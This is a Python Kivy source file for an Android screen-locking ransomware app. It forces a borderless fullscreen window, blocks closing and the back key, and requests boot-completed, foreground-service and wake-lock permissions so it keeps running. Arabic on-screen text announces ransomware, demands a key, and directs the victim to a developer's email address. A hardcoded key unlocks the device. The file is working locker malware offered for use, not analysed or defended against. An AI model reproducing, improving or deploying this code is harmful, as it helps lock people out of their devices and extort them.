from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle
from kivy.utils import platform
from kivy.clock import Clock

if platform == 'android':
    from android.permissions import request_permissions, Permission
    from jnius import autoclass

SKULL = """
       ▄▄▄▄▄▄▄▄▄▄▄
    ▄███████████████▄
   ███████████████████
  █████████████████████
  ████▀▀▀█████▀▀▀██████
  ████   █████   ██████
  ████   █████   ██████
  █████████████████████
   ██████▀▀▀▀▀███████
    ███████████████
     ████ ████ ████
      ██   ██   ██
"""

class RansomScreen(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 30
        self.spacing = 15

        with self.canvas.before:
            Color(0, 0, 0, 1)
            self.rect = Rectangle(size=self.size, pos=self.pos)
        self.bind(size=self._update_rect, pos=self._update_rect)

        self.add_widget(Label(
            text=":) أووبس!! إنه فيروس الفدية",
            font_size='25sp',
            color=(1, 0, 0, 1),
            size_hint_y=None,
            height=60
        ))

        self.add_widget(Label(
            text="أدخل المفتاح",
            font_size='20sp',
            color=(1, 1, 1, 1),
            size_hint_y=None,
            height=40
        ))

        self.entry = TextInput(
            multiline=False,
            halign='center',
            font_size='25sp',
            background_color=(0.1, 0.1, 0.1, 1),
            foreground_color=(1, 1, 1, 1),
            size_hint_y=None,
            height=60
        )
        self.add_widget(self.entry)

        self.btn = Button(
            text="حذف الفيروس",
            font_size='20sp',
            background_color=(1, 0.4, 0, 1),
            size_hint_y=None,
            height=60
        )
        self.btn.bind(on_press=self.check_key)
        self.add_widget(self.btn)

        self.add_widget(Label(
            text=SKULL,
            font_size='8sp',
            color=(1, 1, 1, 1),
            size_hint_y=None,
            height=250
        ))

        self.add_widget(Label(
            text="تواصل مع مطور الفيروس للحصول على المفتاح",
            font_size='14sp',
            color=(1, 0.4, 0, 1),
            size_hint_y=None,
            height=30
        ))

        self.add_widget(Label(
            text=" الثنائي المعتم : alth500bywwb@gmail.com",
            font_size='12sp',
            color=(1, 1, 1, 1),
            size_hint_y=None,
            height=30
        ))

    def _update_rect(self, instance, value):
        self.rect.pos = instance.pos
        self.rect.size = instance.size

    def check_key(self, instance):
        if self.entry.text.strip() == "bayerrom512total":
            self.stop_foreground_service()
            Clock.schedule_once(lambda dt: App.get_running_app().stop(), 0.5)

    def stop_foreground_service(self):
        if platform == 'android':
            try:
                Intent = autoclass('android.content.Intent')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                ForegroundService = autoclass('org.kivy.android.ForegroundService')
                activity = PythonActivity.mActivity
                intent = Intent(activity, ForegroundService)
                activity.stopService(intent)
            except Exception as e:
                print("Error:", e)


class RansomApp(App):
    def build(self):
        Window.fullscreen = True
        Window.borderless = True
        Window.bind(on_request_close=lambda x: True)
        if platform == 'android':
            Clock.schedule_once(lambda dt: self.request_perms(), 0.5)
        return RansomScreen()

    def request_perms(self):
        try:
            perms = [
                Permission.RECEIVE_BOOT_COMPLETED,
                Permission.FOREGROUND_SERVICE,
                Permission.WAKE_LOCK,
            ]
            if hasattr(Permission, 'POST_NOTIFICATIONS'):
                perms.append(Permission.POST_NOTIFICATIONS)
            request_permissions(perms)
        except Exception as e:
            print("Perm error:", e)

    def on_keyboard(self, window, key, *args):
        if key == 27:
            return True


if __name__ == '__main__':
    RansomApp().run()
